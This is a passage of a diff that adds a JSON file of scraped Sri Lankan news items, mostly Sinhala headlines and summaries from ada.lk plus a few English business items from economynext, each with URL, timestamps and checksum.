+  },
+  "lankadeepa": {
+    "success": true
+  },
+  "island": {
+    "success": false,
+    "error": {}
+  },
+  "ada": {
+    "success": true,
+    "data": [
+      {
+        "title": "මේ වසරේ මේ දක්වා වෙඩි තැබීම් 89 ක්",
+        "url": "https://www.ada.lk/breaking_news/මේ-වසරේ-මේ-දක්වා-වෙඩි-තැබීම්-89-ක්/11-418140",
+        "timestamp": "28 08 2025 21:29:00",
+        "byline": "මෙම වසරේ මේ දක්වා දිවයින පුරා වෙඩිතැබීම් 89 ක් වාර්තා වී ඇතැයි පොලිස් මූලස්ථානය කියයි. මේ වන විට පුද්ගලයන් 48 කු මියගොස් තවත් පුද්ගලයන් 50ක් පමණ තුවාල ලබා ඇත.",
+        "isoTimestamp": "2025-08-29T02:40:55+05:30",
+        "baseUrl": "https://www.ada.lk",
+        "checkSum": "656d920e00f72e5442175399d1713ffacbd3ae10eb2a633cdf7ea4f419b8ed57"
+      },
+      {
+        "title": "ගුවන් ධාවන පථ ආශ්‍රිතව සරුංගල් යැවීම අවධානම්",
+        "url": "https://www.ada.lk/breaking_news/ගුවන්-ධාවන-පථ-ආශ්‍රිතව-සරුංගල්-යැවීම-අවධානම්/11-418136",
+        "timestamp": "28 08 2025 20:24:00",
+        "byline": "මේ දිනවල ප්‍රචලිතව පවතින සරුංගල් යැවීම ආශ්‍රිතව සිදුවිය හැකි ගුවන් අනතුරු සම්බන්ධයෙන් ගුවන් හමුදාවෙන් අනතුරු ඇඟවීමේ නිවේදනයක් නිකුත් කර තිබේ.",
+        "isoTimestamp": "2025-08-29T02:40:55+05:30",
+        "baseUrl": "https://www.ada.lk",
+        "checkSum": "15ce1dd5618b865083bff30a6ffe452b0051f7c1c538b6eca9f0215bad85cf05"
+      },
+      {
+        "title": "තෙත් කලාපය හා කඳුකර ආක්‍රමණය කරන විසිතුරු ශාකය",
+        "url": "https://www.ada.lk/opinion/තෙත්-කලාපය-හා-කඳුකර-ආක්‍රමණය-කරන-විසිතුරු-ශාකය/2-418134",
+        "timestamp": "28 08 2025 19:41:00",
+        "byline": "තාල වර්ගයට අයත් Ivory Cane Palm / Ivory Palm යන විසිතුරු ශාකය නුදුරේදීම තෙත් කළාපීය සහ කදුකර වනාන්තර ආක්‍රමණය කිරීමේ දැඩි අවධානමක් නිරීෂක්ෂණය වී ඇති බවත් ඒ අනුව ඒ පිළිබඳ වනසංරක්ෂණ දෙපාර්තමේන්තුවේ අවධානය කඩිනමින් යොමුවිය යුතු බවත් ජ්‍යෙෂ්ඨ පරිසර නීතීඥ, ආචාර්ය ජගත් ගුණවර්ධන මහතා අවධාරණය කරයි.",
+        "isoTimestamp": "2025-08-29T02:40:55+05:30",
+        "baseUrl": "https://www.ada.lk",
+        "checkSum": "fab751823c917e12733b73917952773943a2f45df391c692f2b4de6d225e7ab4"
+      },
+      {
+        "title": "මාරක රිය අනතුරකින්  පාසල් සිසුවියක් හා රිය සහායක මියයයි",
+        "url": "https://www.ada.lk/breaking_news/මාරක-රිය-අනතුරකින්--පාසල්-සිසුවියක්-හා-රිය-සහායක-මියයයි/11-418133",
+        "timestamp": "28 08 2025 18:59:00",
+        "byline": "හොරොව්පොතාන, කහටගස්දිගිලිය ප්‍රධාන මාර්ගයේ ඇලයාපත්තුව ප්‍රදේශයේදී අද (28) සවස සිදුවූ මාරක රිය අනතුරකින් පාසල් සිසුවියක් සහ රිය සහයකයෙකු ජීවිතක්ෂයට පත්ව ඇති බව හොරොව්පොතාන පොලිසිය කියයි.",
+        "isoTimestamp": "2025-08-29T02:40:55+05:30",
+        "baseUrl": "https://www.ada.lk",
+        "checkSum": "477f5af967918b060638241f13468131d8385a2033bab8848926d603636dd571"
+      },
+      {
+        "title": "පොඩි මැණිකේ දුම්රිය කාර්මිකයා පොඩි මැණිකේටම යටවී ජීවිතක්ෂයට",
+        "url": "https://www.ada.lk/breaking_news/පොඩි-මැණිකේ-දුම්රිය-කාර්මිකයා-පොඩි-මැණිකේටම-යටවී-ජීවිතක්ෂයට/11-418130",
+        "timestamp": "28 08 2025 18:12:00",
+        "byline": "කොළඹ කොටුව සිට බදුල්ල බලා ධාවනය වෙමින් තිබූ අංක 1005 දරන පොඩිමැණිකේ දුම්රියෙ ගමන් ගත් කාර්මික නිළධාරියකු  අද  (28) පස්වරුවේ බණ්ඩාරවෙල දුම්රිය ස්ථානය අසල දී දුම්රියේන් ඇද වැටී එම දුම්රියටම යටවීමෙන් මිය ගිය බව බණ්ඩාරවෙල පොලිසිය පවසයි .",
+        "isoTimestamp": "2025-08-29T02:40:55+05:30",
+        "baseUrl": "https://www.ada.lk",
+        "checkSum": "b270149e2ce88001616f17d07d0303e9dd0a11eea12cf47bb50ed79ae0039133"
+      },
+      {
+        "title": "අස්ගිරි අනුනායක ධුරයට නාරම්පනාවේ ආනන්ද හිමියෝ පත්වෙති",
+        "url": "https://www.ada.lk/breaking_news/අස්ගිරි-අනුනායක-ධුරයට-නාරම්පනාවේ-ආනන්ද-හිමියෝ-පත්වෙති/11-418138",
+        "timestamp": "28 08 2025 18:03:00",
+        "byline": "අස්ගිරි මහා විහාර පාර්ශ්වයේ අභිනව අනූනායක හිමියන් වශයෙන් ධර්මාචාර්ය පූජ්‍ය නාරම්පනාවේ ආනන්ද හිමියන් එහි කාරක මහා සංඝ සභාව විසින් නිතරඟයෙන් පත්කර ගන්නා ලදී.",
+        "isoTimestamp": "2025-08-29T02:40:55+05:30",
+        "baseUrl": "https://www.ada.lk",
+        "checkSum": "029445160cf7bf913275414041613cc03b58883c47e7e8db7f69645b5de1f7cd"
+      },
+      {
+        "title": "තිස්ස හා රිදියගම වැව්වල සීමා සලකුණු කරයි",
+        "url": "https://www.ada.lk/breaking_news/තිස්ස-හා-රිදියගම-වැව්වල-සීමා-සලකුණු-කරයි/11-418129",
+        "timestamp": "28 08 2025 17:17:00",
+        "byline": "ජල මූලාශ්‍රවල තිරසර බව රැක ගනිමින් සංවර්ධන කාර්යයන් සිදුකිරීම පහසු කිරීම සඳහා වාංරිමාර්ග දෙපාර්තමේන්තුව යටතේ පාලනය වන ප්‍රධාන වැව්වල සීමා සලකුණු කිරීම යටතේ හම්බන්තොට දිස්ත්‍රික්කයේ තිස්ස හා රිදියගම යන වැව්වල සීමා සලකුණු කිරීමට තීරණය කර තිබේ.",
+        "isoTimestamp": "2025-08-29T02:40:55+05:30",
+        "baseUrl": "https://www.ada.lk",
+        "checkSum": "5330f25cf2a24147a17eaacf642967522331964ee01a19a6e7d7e4bedf15d00d"
+      },
+      {
+        "title": "විශ්‍රාම ගිය දේශපාලඥයෝ කරවල  කරලා දුමේ දාලා තියා ගත යුතුද?",
+        "url": "https://www.ada.lk/breaking_news/විශ්‍රාම-ගිය-දේශපාලඥයෝ-කරවල--කරලා-දුමේ-දාලා-තියා-ගත-යුතුද-/11-418128",
+        "timestamp": "28 08 2025 16:29:00",
+        "byline": "’’ජනාධිපතිවරු, පාර්ලිමේන්තු මන්ත්‍රීවරු මේ කිසි කෙනෙකුගේ විශ්‍රාම වැටුප් සියල්ලම අහෝසි කළ යුතුයි.අපේ රටේ මහජන බදු මුදල් වලින් මේ දේශපාලඥයෝ නඩත්තු කරන්නේ. ඇයි ඒ නඩත්තු කරන්නේ, මොකක්ද අවශ්‍යතාව. එහෙම නම් මැරුණාම කරවල කරලා දුමේ දාලා තියා ගන්නත් ඕන’’ යැයි ජාතික නාමල් උයනේ නිර්මාතෘ වනවාසී රාහුල හිමියන් පැවසූහ.",
+        "isoTimestamp": "2025-08-29T02:40:55+05:30",
+        "baseUrl": "https://www.ada.lk",
+        "checkSum": "73bf75b2e4d46d412c319dc0459d7782764336bfacc98d1f3cddff3f8d252242"
+      },
+      {
+        "title": "කොළඹ වරායේ සමූහ මීනී වලෙන් පුද්ගලයන් 88 දෙනෙකුගේ අස්ථි හමුවේ",
+        "url": "https://www.ada.lk/breaking_news/කොළඹ-වරායේ-සමූහ-මීනී-වලෙන්-පුද්ගලයන්-88-දෙනෙකුගේ-අස්ථි-හමුවේ/11-418127",
+        "timestamp": "28 08 2025 15:41:00",
+        "byline": "කොළඹ වරාය පරිශ්‍රයේ පිහිටි සමූහ මිනී වළක් පරික්ෂා කිරීමෙන් පසු අගෝස්තු මස 26 වෙනිදා එම මිනී වළේ තිබේ පුද්ගලයන් 88 දෙනෙකුට අයත් අස්ථි කොටස් සොයා ගෙන ඇතැයි මෝදර පොලිසිය පවසයි.",
+        "isoTimestamp": "2025-08-29T02:40:55+05:30",
+        "baseUrl": "https://www.ada.lk",
+        "checkSum": "e8ebc3ac71087d2ef29cf5024c86cb9ec63c00b783c2a616295290e9c5ab8ac8"
+      },
+      {
+        "title": "සහස්දනවි සහ සොබාදනවි ගැන ආංශික අධීක්ෂණ කාරක සභාවේ අවධානය",
+        "url": "https://www.ada.lk/breaking_news/සහස්දනවි-සහ-සොබාදනවි-ගැන-ආංශික-අධීක්ෂණ-කාරක-සභාවේ-අවධානය/11-418126",
+        "timestamp": "28 08 2025 14:51:00",
+        "byline": "ඉදිරියේදී වැඩ අවසන් කිරීමට නියමිත කෙරවලපිටිය සහස්දනවි ද්‍රවීකෘත ස්වාභාවික වායු (LNG) බලාගාරයට අදාළව අනුමතිය ලබාගත් කැබිනට් පත්‍රිකාවේ අන්තර්ගත මිල ගණන් වර්තමානයට ගැළපෙන පරිදි වෙනස් කිරීමේ අවශ්‍යතාව යටිතල පහසුකම් සහ උපාය මාර්ගික සංවර්ධනය පිළිබඳ ආංශික අධීක්ෂණ කාරක සභාවේදී පෙන්වා දෙන ලදී.",
+        "isoTimestamp": "2025-08-29T02:40:55+05:30",
+        "baseUrl": "https://www.ada.lk",
+        "checkSum": "fd31a11e1630663d520c79ac761533c459c4bfe7c80fc71bcb82ae1b6a2cbf35"
+      },
+      {
+        "title": "මසක් තුළ ඇමෙරිකාවේ දෙවැනි යුද නෞකාවත් ලංකාවට එයි",
+        "url": "https://www.ada.lk/picture_story/මසක්-තුළ-ඇමෙරිකාවේ-දෙවැනි-යුද-නෞකාවත්-ලංකාවට-එයි/10-418125",
+        "timestamp": "28 08 2025 14:13:00",
+        "byline": "ඇමෙරිකා එක්සත් ජනපද නාවික හමුදාවට අයත් ‘USS TULSA (LCS 16)’ යුද නෞකාව සැපයුම් හා සේවා අවශ්‍යතා සපුරා ගැනීම සඳහා 2025 අගෝස්තු මස 27 වැනි දින කොළඹ වරායට පැමිණි අතර, ශ්‍රී ලංකා නාවික හමුදාව විසින් එම නෞකාව, නාවික හමුදා සම්ප්‍රදායානුකුලව පිළිගැනීම සිදුකෙරිණි.",
+        "isoTimestamp": "2025-08-29T02:40:55+05:30",
+        "baseUrl": "https://www.ada.lk",
+        "checkSum": "4904c79021c93ed16e4a990cf31f0aeb7bcb16f9058062c4a960499ed441c4a7"
+      },
+      {
+        "title": "අපුරේ හා පොලොන්නරුවේ ලංගම වර්ජනයක් නෑ",
+        "url": "https://www.ada.lk/breaking_news/අපුරේ-හා-පොලොන්නරුවේ-ලංගම-වර්ජනයක්-නෑ/11-418124",
+        "timestamp": "28 08 2025 13:31:00",
+        "byline": "ඉල්ලීම් කිහිපයක් මුල් කරගෙන 27 වනදා මධ්‍යම රාත්‍රියේ සිට ශ්‍රී ලංකා ගමනාගමන මණ්ඩලයේ වෘත්තීය සමිති සන්ධානය වැඩ වර්ජනයක් ආරම්භ කිරීමට නියමිතව තිබුණද, අනුරාධපුර සහ පොළොන්නරුව දිස්ත්‍රික්කවල කිසිදු වැඩ වර්ජනයක් සිදු නොවූ බව ලංගම සේවක පිරිසක් සඳහන් කළහ.",
+        "isoTimestamp": "2025-08-29T02:40:55+05:30",
+        "baseUrl": "https://www.ada.lk",
+        "checkSum": "38365251998d51b30deab3dcee5d36e73c07bb1179f529eb074bd97e736d2bb6"
+      },
+      {
+        "title": "රත්නපුරේ ලංගම ඩිපෝ පහෙන් තුනක් පාඩුයි",
+        "url": "https://www.ada.lk/breaking_news/රත්නපුරේ-ලංගම-ඩිපෝ-පහෙන්-තුනක්-පාඩුයි/11-418123",
+        "timestamp": "28 08 2025 13:04:00",
+        "byline": "රත්නපුර දිස්ත්‍රික්කයේ රත්නපුර, ඇඹිලිපිටිය සහ ගොඩකවෙල ඩිපෝ තුනට ඔවුන්ගේ සේවකයන්ගේ වැටුප් ගෙවා ගත හැකි ආදායමක් මාසිකව නොලබන බව අනාවරණය වෙයි.",
+        "isoTimestamp": "2025-08-29T02:40:55+05:30",
+        "baseUrl": "https://www.ada.lk",
+        "checkSum": "ecb8ca8f1020beec9532e434d3d04917f98999302517882a848862f3d33d52d0"
+      },
+      {
+        "title": "කෙහෙල්බද්දර පද්මේ ඇතුළු පිරිස මෙරටට ගේන දිනය ගැන ඇමතිගෙන් ප්‍රකාශයක්",
+        "url": "https://www.ada.lk/breaking_news/කෙහෙල්බද්දර-පද්මේ-ඇතුළු-පිරිස-මෙරටට-ගේන-දිනය-ගැන-ඇමතිගෙන්-ප්‍රකාශයක්/11-418121",
+        "timestamp": "28 08 2025 12:38:00",
+        "byline": "ඉන්දුනීසියාවේ දී සිදුකළ ඒකාබද්ධ මෙහෙයුමකින් අනතුරුව අත්අඩංගුවට ගත් සංවිධානාත්මක අපරාධ කල්ලි සාමාජිකයින් ඉදිරි දින දෙක තුන තුළ මෙරටට ගෙන්වා ගැනීමට කටයුතු කරන බව මහජන ආරක්ෂක අමාත්‍ය ආනන්ද විජේපාල මහතා පැවසීය.",
+        "isoTimestamp": "2025-08-29T02:40:55+05:30",
+        "baseUrl": "https://www.ada.lk",
+        "checkSum": "d7698c871301bfeecc2cbd2eee624aaec0de0300f309cc36462e071ece023e2a"
+      },
+      {
+        "title": "සබරගමුවේ සංවර්ධන නිලධාරීන් දහසක අතිරික්තයක්",
+        "url": "https://www.ada.lk/breaking_news/සබරගමුවේ-සංවර්ධන-නිලධාරීන්-දහසක-අතිරික්තයක්/11-418122",
+        "timestamp": "28 08 2025 10:53:00",
+        "byline": "සබරගමු පළාතේ රාජ්‍ය ආයතනවල අතිරික්තව සිටින දහසකට ආසන්න සංවර්ධන නිලධාරීන් වහාම ඵලදායී රාජ්‍ය සේවය සඳහා අනුයුක්ත කරන ලෙස සබරගමුව පළාත් ආණ්ඩුකාර චම්පා චජනකි රාජරත්න මහත්මිය 27දා නියෝග කළාය.",
+        "isoTimestamp": "2025-08-29T02:40:55+05:30",
+        "baseUrl": "https://www.ada.lk",
+        "checkSum": "64948abf2fc38103651fbd6f5a16b575971e68b1d640516fd2e0c1500ad56fa6"
+      },
+      {
+        "title": "පානදුර නිලංකගේ මාමා වෙඩි තබා ඝාතනය කරයි",
+        "url": "https://www.ada.lk/breaking_news/පානදුර-නිලංකගේ-මාමා-වෙඩි-තබා-ඝාතනය-කරයි/11-418120",
+        "timestamp": "28 08 2025 10:01:00",
+        "byline": "සංවිධානාත්මක අපරාධකල්ලි සාමාජිකයෙක් හා මත්ද්‍රව්‍ය ජාවාරම්කරුවෙක් බව කියන පානදුර නිලංකගේ බිරිඳගේ පියා වෙඩි තබා ඝාතනය කර ඇති බව වාර්තා වෙයි.",
+        "isoTimestamp": "2025-08-29T02:40:55+05:30",
+        "baseUrl": "https://www.ada.lk",
+        "checkSum": "f6706642a516ccfe464a10ac1453c751281da3bbaacfeac88a8abb5972eeafba"
+      },
+      {
+        "title": "චීනයේ හමුදා පෙළපාලියට කිම් ජොන් උන් එක්වෙයි",
+        "url": "https://www.ada.lk/breaking_news/චීනයේ-හමුදා-පෙළපාලියට-කිම්-ජොන්-උන්-එක්වෙයි/11-418119",
+        "timestamp": "28 08 2025 09:11:00",
+        "byline": "චීනයේ ජපානයට එරෙහි යුද්ධයේ 80 වන සංවත්සරය සහ දෙවන ලෝක යුද්ධයේ අවසානය සනිටුහන් කිරීම වෙනුවෙන් පැවැත්වෙන ’’ජයග්‍රාහී දින’’ චීන හමුදා පෙළපාළියට  උතුරු කොරියානු නායක කිම් ජොන් උන්එක්වන බව චීන විදේශ අමාත්‍යාංශය කියයි.",
+        "isoTimestamp": "2025-08-29T02:40:55+05:30",
+        "baseUrl": "https://www.ada.lk",
+        "checkSum": "b8b742e0740120103d58b635ee1cf41e942469e9b13d3d2169142792ac7fddcf"
+      },
+      {
+        "title": "උක් ගොවීන්ගේ සියලු මුදල් ගෙවා අවසන් කරන්න",
+        "url": "https://www.ada.lk/breaking_news/උක්-ගොවීන්ගේ-සියලු-මුදල්-ගෙවා-අවසන්-කරන්න/11-418118",
+        "timestamp": "28 08 2025 08:26:00",
+        "byline": "කර්මාන්ත සහ ව්‍යවසායකත්ව සංවර්ධන අමාත්‍යාංශයට 2025 වසරේ වෙන් කෙරුණු අයවැය ප්‍රතිපාදන මත ක්‍රියාත්මක ව්‍යාපෘති පිළිබඳ සමාලෝචනය සහ 2026 වසරට අදාළ පූර්ව අයවැය සාකච්ඡාව ජනාධිපති අනුර කුමාර දිසානායක මහතාගේ ප්‍රධානත්වයෙන් ජනාධිපති කාර්යාලයේදී පැවැත්විණි.",
+        "isoTimestamp": "2025-08-29T02:40:55+05:30",
+        "baseUrl": "https://www.ada.lk",
+        "checkSum": "dda0f119684fc5831b56574bd6921c3d0ea0c051f304cd4530813e3e82434776"
+      },
+      {
+        "title": "කෙහෙල්බද්දර පද්මේ, කමාන්ඩෝ සලින්ත ඇතුළු 6ක් ඉන්දුනීසියාවේදී අත්අඩංගුවට",
+        "url": "https://www.ada.lk/breaking_news/කෙහෙල්බද්දර-පද්මේ--කමාන්ඩෝ-සලින්ත-ඇතුළු-6ක්-ඉන්දුනීසියාවේදී-අත්අඩංගුවට/11-418116",
+        "timestamp": "28 08 2025 07:39:00",
+        "byline": "කෙහෙල්බද්දර පද්මේ, කමාන්ඩෝ සලින්ත ඇතුළු සංවිධානාත්මක අපරාධකල්ලි සාමාජිකයන් පිරිසක්  ඉන්දුනීසියාවේදී  අත්අඩංගුවට ගෙන තිබේ.",
+        "isoTimestamp": "2025-08-29T02:40:55+05:30",
+        "baseUrl": "https://www.ada.lk",
+        "checkSum": "7ae5efd3aeb918185096ab113c2daaa328e02db42b2e6fcdab769957215bf03b"
+      },
+      {
+        "title": "නව අස්ගිරි අනුනායක හිමි තෝරා ගැනීමට සංඝ සභාව අද රැස්වෙයි",
+        "url": "https://www.ada.lk/breaking_news/නව-අස්ගිරි-අනුනායක-හිමි-තෝරා-ගැනීමට-සංඝ-සභාව-අද-රැස්වෙයි/11-418109",
+        "timestamp": "28 08 2025 07:29:00",
+        "byline": "අස්ගිරි මහා විහාර පාර්ශ්වයට නව අනුනායක හිමිනමක තෝරා ගැනීම සඳහා එම පාර්ශවයේ මහා නායක හිමියන් ප්‍රමුඛ මහා කාරක සංඝ සභාව අද (28) රැස්වීමට නියමිතය.",
+        "isoTimestamp": "2025-08-29T02:40:55+05:30",
+        "baseUrl": "https://www.ada.lk",
+        "checkSum": "25e0e8267b53416b55e8c8a8146a651891b1c409609576c7229e628c422695a6"
+      },
+      {
+        "title": "ජනපති පත්වී ලබන මාසයට අවුරුද්දයි, ආර්ථිකය ස්ථාවරයි",
+        "url": "https://www.ada.lk/breaking_news/ජනපති-පත්වී-ලබන-මාසයට-අවුරුද්දයි--ආර්ථිකය-ස්ථාවරයි/11-418112",
+        "timestamp": "27 08 2025 22:28:00",
+        "byline": "අනුර කුමාර දිසානායක මහතා  ජනාධිපති ධුරයට පත්ව අවුරුද්දකට ආසන්න වන විට මෙරට පැහැදිලිවම ආර්ථිකය ශක්තිමත්ව සහ ස්ථාවරව ඉදිරියට යන බව විදේශ කටයුතු, විදේශ රැකියා සහ සංචාරක අමාත්‍ය විජිත හේරත් මහතා පැවසීය.",
+        "isoTimestamp": "2025-08-29T02:40:55+05:30",
+        "baseUrl": "https://www.ada.lk",
+        "checkSum": "4e9dc816823070cb85e8282f0ca623128a4db7e289296fa6f66d5ff76fe15fe3"
+      },
+      {
+        "title": "දියවැඩියා රෝගීන්ගෙන් බහුතරයක් නිසි ප්‍රතිකාර ගන්නේ නෑ",
+        "url": "https://www.ada.lk/breaking_news/දියවැඩියා-රෝගීන්ගෙන්-බහුතරයක්-නිසි-ප්‍රතිකාර-ගන්නේ-නෑ/11-418113",
+        "timestamp": "27 08 2025 21:35:00",
+        "byline": "දියවැඩියාවට ගොදුරුවූවන්ගෙන් 80%ක් පමණ නිසි අවබෝධයකින් ප්‍රතිකාර නොගන්නා බවට පවතින සංඛ්‍යා ලේඛන මගින් අනාවරණය වී ඇතැයි සෞඛ්‍ය අමාත්‍ය, වෛද්‍ය නලින්ද ජයතිස්ස මහතා ප්‍රකාශ කළේය.",
+        "isoTimestamp": "2025-08-29T02:40:55+05:30",
+        "baseUrl": "https://www.ada.lk",
+        "checkSum": "ef6fc82bebc8e615c9f00135fb5fa79ffd82b51502f6bbff60f2cb6a3386d5fd"
+      },
+      {
+        "title": "පොලීසියේ පුටු 30000 ක හිඟයක්",
+        "url": "https://www.ada.lk/breaking_news/පොලීසියේ-පුටු-30000-ක-හිඟයක්/11-418114",
+        "timestamp": "27 08 2025 21:25:00",
+        "byline": "පොලිස් නිලධාරීන්  හා පොලිස් විශේෂ කාර්ය බලකායෙහි නිලධාරීන්  86000 කට ආසන්න පිරිසක් දිවයින පුරා පොලිස් රාජකාරිය ඉටුකළත්  තවත් 30000ක  ඌනතාවක්  පවතින බව පොලිස්පතිවරහා විසින් සිදුකරන ලද සමීක්ෂණයකදී අනාවරණය කරගෙන ඇතැයි පොලිස් මූලස්ථානය සඳහන් කරයි.",
+        "isoTimestamp": "2025-08-29T02:40:55+05:30",
+        "baseUrl": "https://www.ada.lk",
+        "checkSum": "7e7e7386319fcf23639884896c5d798238e1c010074a9107afd40de293a4b272"
+      },
+      {
+        "title": "අගමැතිනියගේ ආරක්ෂක නිලධාරීන්ගෙන් ප්‍රකාශ ගන්නැයි නියෝග",
+        "url": "https://www.ada.lk/breaking_news/අගමැතිනියගේ-ආරක්ෂක-නිලධාරීන්ගෙන්-ප්‍රකාශ-ගන්නැයි-නියෝග/11-418115",
+        "timestamp": "27 08 2025 19:34:00",
+        "byline": "අග්‍රාමාත්‍ය හරිනි අමරසුරිය මෙනවියගෙන් සහ ඇගේ ආරක්‍ෂාවට යොදවා සිටින නිලධාරීන්ගෙන් ප්‍රකාශ සටහන් කරගන්නා ලෙස මාලිගාකන්ද මහේස්ත්‍රාත් ලෝචනී අබේවික්‍රම මහත්මිය රහස් පොලීසියට අද (27දා) නියම කළාය.",
+        "isoTimestamp": "2025-08-29T02:40:55+05:30",
+        "baseUrl": "https://www.ada.lk",
+        "checkSum": "82f2323e4a6994e4b82d4860d42275f3b429f94563dd945df59a8ba5149bced6"
+      },
+      {
+        "title": "වැවට සවියක් යටතේ වැව් 109ක් හදයි",
+        "url": "https://www.ada.lk/breaking_news/වැවට-සවියක්-යටතේ-වැව්-109ක්-හදයි/11-418111",
+        "timestamp": "27 08 2025 19:31:00",
+        "byline": "“වැවට සවියක්” ජාතික වැඩසටහන  යටතේ  මහවැලි කලාපයෙහි  පිහිටි කුඩා හා මධ්‍ය පරිමාණ සියලුම වැව් ප්‍රතිසංස්කරණය කිරීමේ ජාතික වැඩසටහනක් ‘ක්‍රියාත්මක කරන  බව කෘෂිකර්ම පශූ සම්පත් ඉඩම්‍ හා වාරිමාර්ග අමාත්‍යංශය සඳහන් කරයි.",
+        "isoTimestamp": "2025-08-29T02:40:55+05:30",
+        "baseUrl": "https://www.ada.lk",
+        "checkSum": "b103c0cc131c88b7765cbdbb359703d930511190fc757e1188573d4d6806b33f"
+      },
+      {
+        "title": "දුම්රිය ස්ථානාධිපති තනතුරට පිරිමි අයදුම්කරුවන් පමණක් යන ගැසට් නිවේදනය සංශෝධනය කරනවා",
+        "url": "https://www.ada.lk/breaking_news/දුම්රිය-ස්ථානාධිපති-තනතුරට-පිරිමි-අයදුම්කරුවන්-පමණක්-යන-ගැසට්-නිවේදනය-සංශෝධනය-කරනවා/11-418110",
+        "timestamp": "27 08 2025 18:54:00",
+        "byline": "දුම්රිය ස්ථානාධිපතිවරුන් සඳහා පිරිමි අයදුම්කරුවන්ට පමණක් ඉදිරිපත්වීමට හැකි බවට සඳහන් කරමින් නිකුත් කර ඇති ගැසට් නිවේදනය සංශෝධනය කිරීම සඳහා අමාත්‍ය මණ්ඩලයට යොමුකර ඇති බව නීතිපතිවරයා ශ්‍රේෂ්ඨාධිකරණයට අද (27) දැනුම් දුන්නේය.",
+        "isoTimestamp": "2025-08-29T02:40:55+05:30",
+        "baseUrl": "https://www.ada.lk",
+        "checkSum": "6e3a689c72325c330637aebc984e8d7ebd72f2924b0bfc8b4fd26c605961915c"
+      },
+      {
+        "title": "නොරොච්චෝලේ ආරක්ෂාවට ආධාරක විදුලිබල සැපයුමක්",
+        "url": "https://www.ada.lk/breaking_news/නොරොච්චෝලේ-ආරක්ෂාවට-ආධාරක-විදුලිබල-සැපයුමක්/11-418107",
+        "timestamp": "27 08 2025 18:11:00",
+        "byline": "මෙරට විදුලිබල පද්ධතියේ ස්ථායිතාවය පවත්වාගෙන යාමේදී ඉතා වැදගත් කාර්යයක් ඉටුකරන නොරොච්චෝලේ ලක්විජය ගල් අඟුරු විදුලි බලාගාරයේ ප්‍රධාන දුර්වල කමක් වුයේ රට පුරා විදුලිය බිඳ වැටීමකදී බලාගාරයේ සිසිලන පද්ධතියට සහ බොයිලර් පෝෂක ජල සැපයුම් පද්ධතියට ආධාරක විදුලි සැපයුම අකර්මන්‍යය වීමයි. එවැනි තත්වයකදී සිසිලනය සඳහා දින හතරක හෝ පහක කාලයක් මෙහෙයුම් කටයුතු අත්හිටුවීමට සිදු වීමයි. එ නිසා සැළකිය යුතු මූල්‍ය අලාභයක් ද සිදු වේ.",
+        "isoTimestamp": "2025-08-29T02:40:55+05:30",
+        "baseUrl": "https://www.ada.lk",
+        "checkSum": "3c4e6a59c054bef044ae0e446ebb8566e6a0df5fd07124777ececfebff4e05ff"
+      },
+      {
+        "title": "මහනුවරට ඒකාබද්ධ කාල සටහනක්",
+        "url": "https://www.ada.lk/breaking_news/මහනුවරට-ඒකාබද්ධ-කාල-සටහනක්/11-418106",
+        "timestamp": "27 08 2025 17:29:00",
+        "byline": "මහනුවර නගරයේ පවතින අධික වාහන තදබදයට පිළියමක් වශයෙන් නගරය හරහා දිවෙන මගි ප්‍රවාහන බස් රථ එකාබද්ධ කාල සටහනකට අනුව ධාවනය කරවීමේ පෙරහුරු වැඩසටහනක් සැප්තැම්බර් මස 15 වැනි දින සිට ක්‍රියාත්මක කරන ප්‍රවාහන නියෝජ්‍ය අමාත්‍ය වෛද්‍ය ප්‍රසන්න ගුණසේන මහතා පවසයි.",
+        "isoTimestamp": "2025-08-29T02:40:55+05:30",
+        "baseUrl": "https://www.ada.lk",
+        "checkSum": "79e69b2304958443173ff8fd25a532afcb8ad411a9057f8afe296662c6e9a02c"
+      },
+      {
+        "title": "ඥානසාර හිමිට ජනපති සමාව දීමට එරෙහි පෙත්සම්වල තීන්දුව ඉදිරියට",
+        "url": "https://www.ada.lk/breaking_news/ඥානසාර-හිමිට-ජනපති-සමාව-දීමට-එරෙහි-පෙත්සම්වල-තීන්දුව-ඉදිරියට/11-418105",
+        "timestamp": "27 08 2025 16:45:00",
+        "byline": "අධිකරණයට අපහාස කිරීම සම්බන්ධයෙන් සිරදඬුවම් නියම වු බොදු බල සේනා සංවිධානයේ ලේකම් පූජ්‍ය ගලගොඩ අත්තේ ඥානසාර හිමියන් ජනාධිපති සමාව මත නිදහස් කිරීමට හිටපු ජනාධිපති මෛත්‍රිපාල සිරිසේන මහතා ගත් තීරණය ආණ්ඩුක්‍රම ව්‍යවස්ථාවට පටහැනි හෙයින් එම තීරණය බල රහිත කරන්නැයි ඉල්ලා ගොනුකළ පෙත්සම් විභාගය අවසන් කළ ශ්‍රේෂ්ඨාධිකරණය එහි තීන්දුව ඉදිරියේදී ප්‍රකාශයට පත් කරන බව දැනුම් දුන්නේය.",
+        "isoTimestamp": "2025-08-29T02:40:55+05:30",
+        "baseUrl": "https://www.ada.lk",
+        "checkSum": "4df179260fbada3cddb5b54e6b833bcb9e1a22e1c3506f720f51a93328187e3b"
+      }
+    ]
+  },
+  "economynext": {
+    "success": true,
+    "data": [
+      {
+        "title": "Sri Lanka’s Siyapatha Finance to raise Rs4bn in debenture issue",
+        "url": "https://economynext.com/sri-lankas-siyapatha-finance-to-raise-rs4bn-in-debenture-issue-238597/",
+        "timestamp": "August 28, 2025",
+        "byline": "40 million bonds will be issued at 100 rupees each.",
+        "isoTimestamp": "2025-08-28T00:00:00+05:30",
+        "baseUrl": "https://economynext.com",
+        "checkSum": "f6b7fa7403414cf4a9ed83f633a9e2477ac97b102e7192f41c5c08ce1c3dd2b5"
+      },
+      {
+        "title": "Sri Lanka rupee stronger against dollar, bond yields steady",
+        "url": "https://economynext.com/sri-lanka-rupee-stronger-against-dollar-bond-yields-steady-238591/",
+        "timestamp": "August 28, 2025",
+        "byline": "Rupee",
+        "isoTimestamp": "2025-08-28T00:00:00+05:30",
+        "baseUrl": "https://economynext.com",
+        "checkSum": "397c466f3d6c24d1abafc6ebc4080e1bc678c0b5412bac225b27278ffe275461"
+      },
+      {
+        "title": "Sri Lanka stocks close up 0.23-pct, S&P SL20 dips",
+        "url": "https://economynext.com/sri-lanka-stocks-close-up-0-23-pct-sp-sl20-dips-238567/",
+        "timestamp": "August 28, 2025",
+        "byline": "Turnover rose to 7.4 billion,",
+        "isoTimestamp": "2025-08-28T00:00:00+05:30",
+        "baseUrl": "https://economynext.com",
+        "checkSum": "866722957eef7edbfdb20e48ffe40893fa98e183433b13740cf073801827d8ae"
+      },
+      {
